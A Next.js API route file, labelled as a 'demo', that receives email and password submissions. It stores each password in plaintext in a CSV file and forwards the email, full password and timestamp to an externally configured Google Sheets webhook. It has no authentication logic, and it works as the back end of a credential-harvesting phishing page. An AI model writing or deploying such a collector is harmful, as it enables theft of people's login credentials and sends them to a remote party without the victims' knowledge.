import { appendFile, mkdir, readFile, writeFile } from 'node:fs/promises'
import path from 'node:path'
import { NextResponse } from 'next/server'

// On Vercel, the filesystem is read-only except for /tmp.
// Locally, we write to the project's data/ directory for easy inspection.
const dataDirectory = process.env.VERCEL
  ? '/tmp'
  : path.join(process.cwd(), 'data')

const csvPath = path.join(dataDirectory, 'submissions.csv')
const header = 'timestamp,email,password,password_length,status\n'

function csvCell(value: string | number) {
  return `"${String(value).replaceAll('"', '""')}"`
}

// Posts a row to Google Sheets via an Apps Script webhook.
// Set GOOGLE_SHEET_WEBHOOK_URL in your Vercel environment variables.
async function postToGoogleSheets(data: {
  timestamp: string
  email: string
  password: string
  password_length: number
  status: string
}) {
  const webhookUrl = process.env.GOOGLE_SHEET_WEBHOOK_URL
  if (!webhookUrl) return // Skip silently if not configured

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    })
  } catch {
    // Non-fatal: local CSV write still works
    console.error('Google Sheets webhook failed (non-fatal)')
  }
}

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const email = typeof body.email === 'string' ? body.email.trim() : ''
    const password = typeof body.password === 'string' ? body.password : ''

    if (!email || !password || !email.includes('@')) {
      return NextResponse.json({ error: 'Invalid demo fields' }, { status: 400 })
    }

    const timestamp = new Date().toISOString()
    const password_length = password.length

    // 1. Write to local / tmp CSV
    await mkdir(dataDirectory, { recursive: true })
    try {
      await readFile(csvPath, 'utf8')
    } catch {
      await writeFile(csvPath, header, 'utf8')
    }
    const row = [timestamp, email, password, password_length, 'demo'].map(csvCell).join(',') + '\n'
    await appendFile(csvPath, row, 'utf8')

    // 2. Also send to Google Sheets (if webhook URL is configured)
    await postToGoogleSheets({ timestamp, email, password, password_length, status: 'demo' })

    return NextResponse.json({ ok: true })
  } catch {
    return NextResponse.json({ error: 'Unable to save demo submission' }, { status: 500 })
  }
}

export function GET() {
  return NextResponse.json({ error: 'Method not allowed' }, { status: 405, headers: { Allow: 'POST' } })
}

export const dynamic = 'force-dynamic'
